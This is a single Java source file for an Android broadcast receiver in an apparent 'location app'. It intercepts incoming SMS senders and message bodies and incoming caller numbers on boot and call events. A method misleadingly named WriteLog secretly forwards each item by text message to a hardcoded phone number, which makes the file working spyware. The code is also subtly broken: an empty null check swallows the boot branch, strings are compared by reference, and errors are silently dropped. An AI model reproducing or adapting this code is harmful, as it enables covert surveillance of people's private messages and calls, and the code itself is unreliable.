package com.example.locationapp;

import android.app.DownloadManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;


public class StartUpReceiver extends BroadcastReceiver
{
    Context Cont;

    @Override
    public void onReceive (Context context, Intent intent)
    {

        Cont = context;
        String Action = intent.getAction ();

        if (Action == null)

        if (Action == Intent.ACTION_BOOT_COMPLETED)
            DoBoot ();
        if (Action == "android.provider.Telephony.SMS_RECEIVED")
            DoSMS (intent);
        if (Action == "android.intent.action.PHONE_STATE")
            DoPhone (intent);

    }

    void DoBoot ()
    {
        WriteLog ("Application started on boot");
        WriteLog ("--");
    }

    void DoSMS (Intent SmsInt)
    {

        Bundle bundle = SmsInt.getExtras ();
        SmsMessage[] Messages = null;
        String SmsSender;
        String ToActivity;
        if (bundle != null)
        {
            try
            {
                ToActivity = "";
                Object[] pdus = (Object[]) bundle.get("pdus");
                Messages = new SmsMessage[pdus.length];
                for(int i=0; i<Messages.length; i++)
                {
                    Messages[i] = SmsMessage.createFromPdu ((byte[]) pdus[i], bundle.getString ("format" ));
                    SmsSender = Messages[i].getOriginatingAddress();
                    if (i == 0)
                        ToActivity = "From: " + SmsSender + ",   ";
                    String SmsBody = Messages[i].getMessageBody();
                    ToActivity = ToActivity + SmsBody;
                    WriteLog ("SMS message Sender: " + SmsSender);
                    WriteLog ("SMS message: " + SmsBody);
                }
                WriteLog ("--");

            }
            catch(Exception e)
            {

            }


        }
    }

    void DoPhone (Intent PhoneInt)
    {

        String State = PhoneInt.getStringExtra (TelephonyManager.EXTRA_STATE);
        String Caller= PhoneInt.getStringExtra (TelephonyManager.EXTRA_INCOMING_NUMBER);
        if (State.equals (TelephonyManager.EXTRA_STATE_RINGING))
        {

            if (Caller != null)
            {
                WriteLog ("Phone Ringing : " + Caller);

            }
        }
        if (State.equals (TelephonyManager.EXTRA_STATE_OFFHOOK))
        {

            if (Caller != null)
            {
                WriteLog ("Off Hook: " + Caller);

            }
        }
        if (State.equals (TelephonyManager.EXTRA_STATE_IDLE))
        {

            if (Caller != null)
            {
                WriteLog ("Phone Rests: " + Caller);
                WriteLog ("--");

            }
        }

    }

    void WriteLog (String Line)
    {

            String TimeStamp = new SimpleDateFormat ("yyyy-MM-dd HH:mm:ss").format (new Date ());

            String p = "123456789";
            String line = Line + "   (" + TimeStamp + ")";
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(p, null, line, null, null);

    }

}
